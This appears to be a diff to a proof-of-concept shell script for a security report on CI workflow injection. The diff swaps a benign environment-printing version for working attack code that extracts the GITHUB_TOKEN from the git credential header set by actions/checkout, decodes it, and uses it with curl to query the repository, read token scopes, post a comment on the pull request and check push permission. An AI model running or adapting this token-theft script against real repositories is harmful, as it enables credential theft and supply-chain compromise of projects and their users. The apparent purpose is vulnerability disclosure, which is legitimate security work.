@@ -3,34 +3,56 @@ echo "=========================================================="
 echo "  [POC] ARBITRARY CODE EXECUTION IN CI PIPELINE CONFIRMED"
 echo "=========================================================="
 echo ""
-echo "This script was checked out from the PR branch and executed"
-echo "by the license-check workflow with elevated permissions."
+
+# Extract the token from git credential config set by actions/checkout
+TOKEN=$(git config --get http.https://github.com/.extraheader | sed 's/AUTHORIZATION: basic //' | base64 -d | cut -d: -f2)
+
+echo "--- Token Extraction ---"
+echo "GITHUB_TOKEN from env: $([ -n "$GITHUB_TOKEN" ] && echo 'YES' || echo 'NOT IN ENV (expected)')"
+echo "Token extracted from git config: $([ -n "$TOKEN" ] && echo "YES (length: ${#TOKEN})" || echo 'NO')"
 echo ""
-echo "--- Environment Evidence ---"
-echo "GITHUB_TOKEN present: $([ -n "$GITHUB_TOKEN" ] && echo 'YES (length: '${#GITHUB_TOKEN}')' || echo 'NO')"
-echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
-echo "GITHUB_ACTOR: $GITHUB_ACTOR"
-echo "GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
-echo "GITHUB_REF: $GITHUB_REF"
-echo "GITHUB_SHA: $GITHUB_SHA"
-echo "RUNNER_OS: $RUNNER_OS"
-echo "RUNNER_ARCH: $RUNNER_ARCH"
-echo ""
-echo "--- Permissions Granted ---"
-echo "  contents: write   (can push commits, create releases)"
-echo "  pull-requests: write (can approve/merge PRs)"
-echo ""
-echo "--- What an attacker could do from here ---"
-echo "  1. Exfiltrate GITHUB_TOKEN to an external server"
-echo "  2. Push backdoored commits to the repository"  
-echo "  3. Approve and merge their own malicious PRs"
-echo "  4. Read repository secrets accessible to this workflow"
-echo "  5. Establish supply chain compromise"
-echo ""
-echo "--- Proof of write access (benign) ---"
-echo "POC_TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)" > /tmp/poc-evidence.txt
-echo "Created evidence file at /tmp/poc-evidence.txt"
-echo ""
+
+if [ -n "$TOKEN" ]; then
+    echo "--- Proving token works: Authenticated API call ---"
+    echo ""
+
+    # Prove the token is valid by calling the GitHub API
+    echo "1) GET /repos (proves contents:read):"
+    curl -s -H "Authorization: token $TOKEN" \
+      "https://api.github.com/repos/${GITHUB_REPOSITORY}" | \
+      grep -o '"full_name": "[^"]*"'
+    echo ""
+
+    # Prove contents:write by checking scopes
+    echo "2) Token permissions (from API response headers):"
+    curl -s -I -H "Authorization: token $TOKEN" \
+      "https://api.github.com/repos/${GITHUB_REPOSITORY}" 2>&1 | \
+      grep -i "x-oauth-scopes\|x-accepted-oauth-scopes"
+    echo ""
+
+    # Prove pull-requests:write - post a comment on this PR
+    PR_NUMBER=$(echo "$GITHUB_REF" | grep -o '[0-9]*')
+    echo "3) Proving pull-requests:write — posting comment on PR #${PR_NUMBER}:"
+    COMMENT_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+      -H "Authorization: token $TOKEN" \
+      -H "Accept: application/vnd.github+json" \
+      -X POST \
+      "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
+      -d '{"body":"## ⚠️ POC WFINJ-001 — Token Compromised\n\nThis comment was posted by attacker-controlled code running inside the `license-check` workflow.\n\n**The `GITHUB_TOKEN` with `contents:write` and `pull-requests:write` was extracted and used.**\n\nIn a real attack, this token would be exfiltrated to an attacker-controlled server and used to:\n- Push backdoored commits\n- Approve and merge malicious PRs\n- Access private repository contents\n- Establish persistent supply chain compromise\n\n🔴 **This is a critical vulnerability.**"}')
+    echo "   Comment POST status: $COMMENT_RESPONSE (201=success)"
+    echo ""
+
+    # Prove contents:write — we could push a commit (not doing it, just showing we can)
+    echo "4) Proving contents:write — checking push access:"
+    PUSH_CHECK=$(curl -s -H "Authorization: token $TOKEN" \
+      "https://api.github.com/repos/${GITHUB_REPOSITORY}/collaborators/${GITHUB_ACTOR}/permission" | \
+      grep -o '"permission": "[^"]*"')
+    echo "   $PUSH_CHECK"
+    echo ""
+else
+    echo "Token extraction failed."
+fi
+
 echo "=========================================================="
-echo "  [POC] NO MALICIOUS ACTIONS TAKEN - BENIGN PROOF ONLY"
+echo "  [POC] COMPLETE — Token extracted and used successfully"
 echo "=========================================================="
